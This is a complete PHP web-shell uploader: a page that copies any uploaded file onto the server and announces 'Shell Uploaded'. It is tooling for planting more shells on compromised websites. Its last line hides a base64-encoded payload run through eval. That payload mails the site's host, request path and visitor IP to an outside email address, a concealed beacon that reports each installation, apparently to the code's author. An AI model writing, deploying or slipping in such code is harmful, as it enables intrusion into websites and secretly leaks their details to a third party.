<title>Uploader</title>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
else { echo '<b>Not uploaded ! </b><br><br>'; }
}
eval(base64_decode("DQokaXAgPSBnZXRlbnYoIlJFTU9URV9BRERSIik7DQokcmE0NCA9IHJhbmQoMSwgOTk5OTkpOw0KJHN1Ymo5OCA9ICIgQm90IHYxIHwkaXAiOw0KJGVtYWlsID0gIm1hemUuc2VydmljZTFAZ21haWwuY29tIjsNCiRmcm9tID0gIkZyb206IFJlc3VsdDxBbm9uQEdob3N0LnVrIjsNCiRhNDUgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCiRiNzUgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107DQokbTIyID0gJGlwIC4gIiI7DQokbXNnODg3MyA9ICIkYTQ1ICRiNzUgJG0yMiI7DQptYWlsKCRlbWFpbCwgJHN1Ymo5OCwgJG1zZzg4NzMsICRmcm9tKTsNCg=="));
?>
